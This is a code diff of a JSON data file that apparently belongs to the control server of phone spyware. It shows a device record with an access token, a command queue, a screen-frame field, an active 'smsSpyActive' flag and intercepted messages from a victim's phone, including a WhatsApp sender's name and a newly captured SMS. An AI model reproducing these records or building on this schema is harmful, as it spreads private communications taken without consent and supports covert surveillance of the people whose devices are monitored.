@@ -2149,7 +2149,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777767244066,
+    "lastSeen": 1777767247072,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
@@ -2165,6 +2165,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "IM3PREPAID",
+        "content": "Buy Data Package, get cashback GOPAY Up To 10K rupiah , only thru official WA IM3 bit.ly/im3bchot . INDIRA will give a very SPECIAL package just for you",
+        "time": "03/05 07:14",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1777767248884
+      },
       {
         "appName": "WhatsApp",
         "sender": "PP AZKHAL MUSTOFA CIKUDA",
